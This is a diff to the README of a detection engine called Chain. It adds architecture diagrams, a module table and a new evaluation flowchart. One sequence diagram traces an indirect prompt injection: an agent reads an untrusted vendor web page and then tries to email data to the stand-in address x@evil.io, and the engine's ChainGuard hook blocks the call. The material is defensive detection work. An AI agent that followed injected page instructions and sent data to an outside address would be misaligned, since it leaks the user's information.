@@ -27,6 +27,7 @@ Chain is a detection language and engine. It does what YARA, Sigma and Suricata 
 
 ## Contents
 
+- [Architecture](#architecture)
 - [How it works](#how-it-works)
 - [Quick start](#quick-start)
 - [Writing rules](#writing-rules)
@@ -42,17 +43,112 @@ Chain is a detection language and engine. It does what YARA, Sigma and Suricata 
 - [Production swaps](#production-swaps)
 - [Design notes](#design-notes)
 
+## Architecture
+
+```mermaid
+flowchart TB
+    subgraph SRC["Event sources"]
+        SEN["Sensors · EDR · logs"]
+        YAR["Native YARA<br/>as a sensor"]
+        HAR["Agent harness<br/>ChainGuard hooks"]
+    end
+
+    subgraph CONTENT["Detection content"]
+        IMP["importers/<br/>Sigma · YARA"] --> RULES["rules/*.yaml<br/>compiled by rules.py"]
+        CLU["clusters/*.yaml<br/>semantic examples"]
+    end
+
+    subgraph ENG["Engine"]
+        SCH["schema.py<br/>Event · Span · Trust"] --> PROV["provenance.py<br/>artifact + context taint"]
+        PROV --> SM["engine.py<br/>sequence state machine<br/>per rule × group_by"]
+        SM --> PRED["predicates.py<br/>where · rare · sigma"]
+        SM --> NORM["normalize.py<br/>decode every layer"]
+        NORM --> CAS["matchers/<br/>regex → semantic →<br/>classifier → judge"]
+        PRED --- BASE[("baselines")]
+    end
+
+    subgraph OUT["Outputs"]
+        VER["verdict.py<br/>hits + evidence"] --> ACT["allow · alert · redact ·<br/>require_approval · block"]
+        VER --> SOAR["SOAR hints<br/>isolate_host · open_case"]
+        ACT --> ENF["ChainGuard enforcement<br/>ToolBlocked · ApprovalRequired"]
+    end
+
+    SEN --> SCH
+    YAR --> SCH
+    HAR --> SCH
+    RULES --> SM
+    CLU --> CAS
+    SM --> VER
+```
+
+| Layer | Modules | Role |
+|---|---|---|
+| Ingest | `schema.py`, `hooks.py` | One event model for classic and AI telemetry; `ChainGuard` turns agent activity into events and enforces verdicts inline |
+| Content | `rules.py`, `importers/`, `clusters/` | YAML rules validated and compiled on load; Sigma/YARA converted; semantic clusters loaded into the index |
+| Context | `provenance.py`, `predicates.py` | Taint over artifacts and agent context; field predicates and `rare:` baselines |
+| Matching | `normalize.py`, `matchers/` | Decode every layer, then run the cost-ordered matcher cascade |
+| Decision | `engine.py`, `verdict.py` | Advance sequences, build hits with evidence, pick the strongest action |
+| Quality | `testing.py`, `replay.py`, `cli.py` | Inline tests, mutation fuzzing, labeled replay with CI gates |
+
 ## How it works
 
 ```mermaid
-flowchart LR
-    S[Sensors / logs / agent hooks] --> E[Event]
-    E --> P[Provenance & taint]
-    P --> R{For each rule:<br/>advance sequences}
-    R --> C1[event type] --> C2[where / rare] --> C3[same] --> C4[tainted_by] --> C5[content cascade]
-    C5 --> H[Hits]
-    H --> V[Verdict:<br/>strongest action wins]
-    V --> A[allow · alert · redact ·<br/>require_approval · block]
+flowchart TD
+    E["Incoming event"] --> D["Resolve due 'not followed by' steps<br/>→ deferred verdicts"]
+    D --> P["Record provenance<br/>inputs/outputs edges · agent context taint"]
+    P --> L{{"For each rule"}}
+    L --> G["Load partial sequences for<br/>rule × group_by value · drop expired windows"]
+    G --> S{{"For each partial + a fresh start:<br/>check its next step"}}
+    S --> C1{"event type<br/>matches?"}
+    C1 -- no --> X["skip"]
+    C1 -- yes --> C2{"where / rare /<br/>sigma pass?"}
+    C2 -- no --> X
+    C2 -- yes --> C3{"same fields as<br/>previous step?"}
+    C3 -- no --> X
+    C3 -- yes --> C4{"tainted_by earlier step<br/>+ min_attribution?"}
+    C4 -- no --> X
+    C4 -- yes --> C5{"content cascade<br/>regex → semantic → classifier → judge"}
+    C5 -- no --> X
+    C5 -- yes --> CNT{"count step:<br/>threshold reached?"}
+    CNT -- not yet --> ACC["keep accumulating"]
+    CNT -- "yes / n.a." --> ADV{"last step?"}
+    ADV -- no --> KEEP["store advanced partial"]
+    ADV -- yes --> HIT["Hit with evidence"]
+    HIT --> V["Verdict: strongest action across all hits"]
+    X --> V
+    KEEP --> V
+    ACC --> V
+    V --> B["Update baselines<br/>after evaluation"]
+    V --> A["allow · alert · redact ·<br/>require_approval · block"]
+```
+
+### Example: blocking an indirect prompt injection
+
+The `ai_indirect_injection_to_exfil` rule, run inside an agent through `ChainGuard`:
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor U as User
+    participant A as Agent
+    participant G as ChainGuard
+    participant E as Engine
+    participant T as send_email tool
+
+    U->>A: "Summarize this vendor page"
+    A->>G: on_prompt(text)
+    G->>E: ai.prompt · trust=user
+    E-->>G: allow
+    A->>G: on_retrieval(page, source="web:vendor.example")
+    G->>E: ai.retrieval · trust=untrusted
+    Note over E: Provenance: session context now tainted by this event<br/>Step "inject": cascade hits (regex / semantic)<br/>Partial sequence stored for session_id
+    E-->>G: allow (sequence in progress)
+    A->>G: pre_tool_call("send_email", to="x@evil.io", external=True)
+    G->>E: ai.tool_call · dest_external=true
+    Note over E: Step "exfil": tool name + external dest match,<br/>tainted_by inject via context → sequence complete
+    E-->>G: Verdict: BLOCK + evidence trail
+    G--xA: raise ToolBlocked
+    Note over T: never runs
 ```
 
 For each event, the engine:
